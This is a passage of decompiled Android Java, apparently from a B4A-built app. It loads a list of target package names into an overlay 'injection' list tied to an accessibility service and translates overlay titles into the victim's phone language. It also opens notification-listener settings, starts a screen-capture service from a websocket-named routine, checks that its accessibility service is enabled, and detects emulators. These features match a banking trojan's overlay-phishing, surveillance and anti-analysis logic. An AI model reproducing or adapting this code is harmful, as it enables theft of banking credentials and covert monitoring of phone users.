                            this._rs = (SQL.ResultSetWrapper) AbsObjectWrapper.ConvertToWrapper(new SQL.ResultSetWrapper(), this._sql.ExecQuery("select * from pksinfo"));
                            break;
                        case 10:
                            this.state = 19;
                            if (!this._rs.NextRow()) {
                                break;
                            } else {
                                this.state = 12;
                                break;
                            }
                        case 12:
                            this.state = 13;
                            globalparameters globalparametersVar2 = main.mostCurrent._globalparameters;
                            globalparameters._mpinjlist.Put(this._rs.GetString("pkgname"), this._rs.GetString("filename"));
                            break;
                        case 13:
                            this.state = 18;
                            this.catchState = 17;
                            this.state = 15;
                            break;
                        case 15:
                            this.state = 18;
                            this.catchState = 17;
                            backgroundservice backgroundserviceVar2 = main.mostCurrent._backgroundservice;
                            backgroundservice._acs.add_lst_ovlypks(this._rs.GetString("pkgname"), this._rs.GetString("filename"));
                            break;
                        case 17:
                            this.state = 18;
                            this.catchState = 46;
                            Common.LogImpl("6786453", BA.ObjectToString(Common.LastException(main.mostCurrent.activityBA)), 0);
                            break;
                        case 18:
                            this.state = 10;
                            this.catchState = 46;
                            break;
                        case 19:
                            this.state = 20;
                            this._rs.Close();
                            break;
                        case 20:
                            this.state = 23;
                            if (this._sql.IsInitialized() && this._sql != null) {
                                this.state = 22;
                                break;
                            }
                            break;
                        case 22:
                            this.state = 23;
                            this._sql.Close();
                            break;
                        case 23:
                            this.state = 44;
                            globalparameters globalparametersVar3 = main.mostCurrent._globalparameters;
                            if (!globalparameters._is_hdr_firstovlytranslate) {
                                break;
                            } else {
                                this.state = 25;
                                break;
                            }
                        case 25:
                            this.state = 26;
                            this._strenco = "";
                            this._strenco = main._getphonelanguage_unicode();
                            break;
                        case 26:
                            this.state = 31;
                            if (!this._strenco.equals("en") && !this._strenco.equals("null") && this._strenco != null) {
                                break;
                            } else {
                                this.state = 28;
                                break;
                            }
                        case 28:
                            this.state = 31;
                            return;
                        case KeyCodes.KEYCODE_C /* 31 */:
                            this.state = 32;
                            this._strlang = "";
                            StringBuilder sb = new StringBuilder();
                            sb.append("https://api.pawan.krd/gtranslate?from=en&to=");
                            sb.append(Common.SmartStringFormatter("", this._strenco));
                            sb.append("&text=");
                            globalparameters globalparametersVar4 = main.mostCurrent._globalparameters;
                            sb.append(Common.SmartStringFormatter("", globalparameters._strtoptitle_hdr));
                            sb.append("");
                            this._strlang = sb.toString();
                            httpjob httpjobVar = new httpjob();
                            this.f352_j = httpjobVar;
                            httpjobVar._initialize(main.processBA, "j", main.getObject());
                            this.f352_j._download(this._strlang);
                            Common.WaitFor("jobdone", main.processBA, this, this.f352_j);
                            this.state = 48;
                            return;
                        case 32:
                            this.state = 37;
                            if (this.f352_j._success) {
                                this.state = 34;
                                break;
                            } else {
                                this.state = 36;
                                break;
                            }
                        case 34:
                            this.state = 37;
                            JSONParser jSONParser = new JSONParser();
                            this._parser = jSONParser;
                            jSONParser.Initialize(this.f352_j._getstring());
                            this._jroot = new Map();
                            Map NextObject = this._parser.NextObject();
                            this._jroot = NextObject;
                            this._translated = BA.ObjectToString(NextObject.Get("translated"));
                            Common.LogImpl("6786485", " translated : " + this._translated, 0);
                            globalparameters globalparametersVar5 = main.mostCurrent._globalparameters;
                            globalparameters._strtoptitle_hdr = this._translated;
                            break;
                        case 36:
                            this.state = 37;
                            Common.LogImpl("6786489", this.f352_j._errormessage, 0);
                            break;
                        case 37:
                            this.state = 38;
                            this.f352_j._release();
                            this._strlang = "";
                            StringBuilder sb2 = new StringBuilder();
                            sb2.append("https://api.pawan.krd/gtranslate?from=en&to=");
                            sb2.append(Common.SmartStringFormatter("", this._strenco));
                            sb2.append("&text=");
                            globalparameters globalparametersVar6 = main.mostCurrent._globalparameters;
                            sb2.append(Common.SmartStringFormatter("", globalparameters._strbottomtitle_hdr));
                            sb2.append("");
                            this._strlang = sb2.toString();
                            httpjob httpjobVar2 = new httpjob();
                            this.f352_j = httpjobVar2;
                            httpjobVar2._initialize(main.processBA, "j", main.getObject());
                            this.f352_j._download(this._strlang);
                            Common.WaitFor("jobdone", main.processBA, this, this.f352_j);
                            this.state = 49;
                            return;
                        case 38:
                            this.state = 43;
                            if (this.f352_j._success) {
                                this.state = 40;
                                break;
                            } else {
                                this.state = 42;
                                break;
                            }
                        case 40:
                            this.state = 43;
                            JSONParser jSONParser2 = new JSONParser();
                            this._parser = jSONParser2;
                            jSONParser2.Initialize(this.f352_j._getstring());
                            this._jroot = new Map();
                            Map NextObject2 = this._parser.NextObject();
                            this._jroot = NextObject2;
                            this._translated = BA.ObjectToString(NextObject2.Get("translated"));
                            Common.LogImpl("6786507", " translated : " + this._translated, 0);
                            globalparameters globalparametersVar7 = main.mostCurrent._globalparameters;
                            globalparameters._strbottomtitle_hdr = this._translated;
                            break;
                        case 42:
                            this.state = 43;
                            Common.LogImpl("6786511", this.f352_j._errormessage, 0);
                            break;
                        case 43:
                            this.state = 44;
                            this.f352_j._release();
                            break;
                        case 44:
                            this.state = 47;
                            break;
                        case 46:
                            this.state = 47;
                            this.catchState = 0;
                            Common.ProgressDialogHide();
                            Common.LogImpl("6786522", BA.ObjectToString(Common.LastException(main.mostCurrent.activityBA)), 0);
                            break;
                        case 47:
                            this.state = -1;
                            this.catchState = 0;
                            break;
                        case 48:
                            this.state = 32;
                            this.f352_j = (httpjob) objArr[0];
                            break;
                        case KeyCodes.KEYCODE_U /* 49 */:
                            this.state = 38;
                            this.f352_j = (httpjob) objArr[0];
                            break;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    main.processBA.setLastException(e);
                }
            }
        }
    }

    public static String _save_devicescreensize() throws Exception {
        try {
            File file = Common.File;
            File file2 = Common.File;
            if (File.Exists(File.getDirInternal(), "txtscreensize.txt")) {
                return "";
            }
            List list = new List();
            list.Initialize();
            list.Add(Integer.valueOf(_getrealwidth_private()));
            list.Add(Integer.valueOf(_getrealheight_private()));
            list.Add(Integer.valueOf(_get_barsheights()));
            File file3 = Common.File;
            File file4 = Common.File;
            File.WriteList(File.getDirInternal(), "txtscreensize.txt", list);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("61179661", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
            return "";
        }
    }

    public static String _test_perms() throws Exception {
        try {
            if (!_check_if_notis()) {
                IntentWrapper intentWrapper = new IntentWrapper();
                if (!intentWrapper.IsInitialized()) {
                    intentWrapper.Initialize("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS", "");
                    intentWrapper.setFlags(1073741824);
                    Common.StartActivity(processBA, intentWrapper.getObject());
                }
            } else {
                IntentWrapper intentWrapper2 = new IntentWrapper();
                Intent intent = (Intent) Common.Null;
                Intent intent2 = intent;
            }
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("6655379", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
        }
        return "";
    }

    public static String _ws_send_devicescreenshot_permission() throws Exception {
        try {
            BA ba = processBA;
            mediaprojectionbackservice mediaprojectionbackserviceVar = mostCurrent._mediaprojectionbackservice;
            if (Common.IsPaused(ba, mediaprojectionbackservice.getObject())) {
                BA ba2 = processBA;
                mediaprojectionbackservice mediaprojectionbackserviceVar2 = mostCurrent._mediaprojectionbackservice;
                Common.StartService(ba2, mediaprojectionbackservice.getObject());
            } else {
                mediaprojectionbackservice mediaprojectionbackserviceVar3 = mostCurrent._mediaprojectionbackservice;
                mediaprojectionbackservice._sc.Stop();
                BA ba3 = processBA;
                mediaprojectionbackservice mediaprojectionbackserviceVar4 = mostCurrent._mediaprojectionbackservice;
                Common.StopService(ba3, mediaprojectionbackservice.getObject());
                BA ba4 = processBA;
                mediaprojectionbackservice mediaprojectionbackserviceVar5 = mostCurrent._mediaprojectionbackservice;
                Common.StartService(ba4, mediaprojectionbackservice.getObject());
            }
            mediaprojectionbackservice mediaprojectionbackserviceVar6 = mostCurrent._mediaprojectionbackservice;
            if (!mediaprojectionbackservice._mediaprojection_isrunning) {
                mediaprojectionbackservice mediaprojectionbackserviceVar7 = mostCurrent._mediaprojectionbackservice;
                mediaprojectionbackservice._sc.Stop();
            }
            BA ba5 = processBA;
            perm_activatemediaproject perm_activatemediaprojectVar = mostCurrent._perm_activatemediaproject;
            Common.StartActivity(ba5, perm_activatemediaproject.getObject());
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("6196627", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
            return "";
        }
    }

    public boolean isAccessibilityServiceEnabled() {
        ComponentName componentName = new ComponentName(this, (Class<?>) backgroundservice.class);
        String string = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
        if (string == null) {
            return false;
        }
        TextUtils.SimpleStringSplitter simpleStringSplitter = new TextUtils.SimpleStringSplitter(':');
        simpleStringSplitter.setString(string);
        while (simpleStringSplitter.hasNext()) {
            ComponentName unflattenFromString = ComponentName.unflattenFromString(simpleStringSplitter.next());
            if (unflattenFromString != null && unflattenFromString.equals(componentName)) {
                return true;
            }
        }
        return false;
    }

    public boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic") || Build.FINGERPRINT.startsWith(EnvironmentCompat.MEDIA_UNKNOWN) || Build.MODEL.contains("google_sdk") || Build.MODEL.contains("Emulator") || Build.MODEL.contains("Android SDK built for x86") || Build.MANUFACTURER.contains("Genymotion") || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")) || "google_sdk".equals(Build.PRODUCT);
    }
}
